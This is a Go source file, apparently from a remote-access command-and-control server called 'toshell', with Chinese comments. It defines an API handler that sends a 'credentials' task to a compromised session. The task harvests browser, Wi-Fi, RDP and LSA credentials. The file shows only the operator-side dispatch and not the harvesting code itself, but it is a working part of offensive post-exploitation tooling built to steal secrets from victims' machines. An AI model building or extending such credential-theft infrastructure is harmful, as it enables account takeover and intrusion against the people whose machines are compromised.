package api

import (
	"encoding/json"
	"net/http"

	"github.com/gorilla/mux"
	"toshell/internal/server/logging"
	"toshell/internal/server/task"
)

// credentialsHandler 处理凭据收集请求
// POST /api/v1/sessions/{id}/credentials
func (s *Server) credentialsHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	var req struct {
		Action string `json:"action"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		req.Action = "all"
	}

	if req.Action == "" {
		req.Action = "all"
	}

	// 验证 action 参数
	validActions := map[string]bool{
		"all":     true,
		"browser": true,
		"wifi":    true,
		"rdp":     true,
		"lsa":     true,
	}
	if !validActions[req.Action] {
		http.Error(w, `{"error":"无效的 action 参数，支持: all, browser, wifi, rdp, lsa"}`, http.StatusBadRequest)
		return
	}

	if s.listener == nil {
		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
		return
	}

	credentialData, _ := json.Marshal(map[string]string{
		"action": req.Action,
	})

	taskInfo, err := s.taskMgr.Create(id, task.TaskParams{
		TaskType: "credentials",
		Data:     string(credentialData),
	})
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	logging.Info("api", "Credential collection task pushed to session %s (action: %s)", id, req.Action)

	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id": taskInfo.ID,
		"action":  req.Action,
		"message": "Credential collection task sent",
	})
}
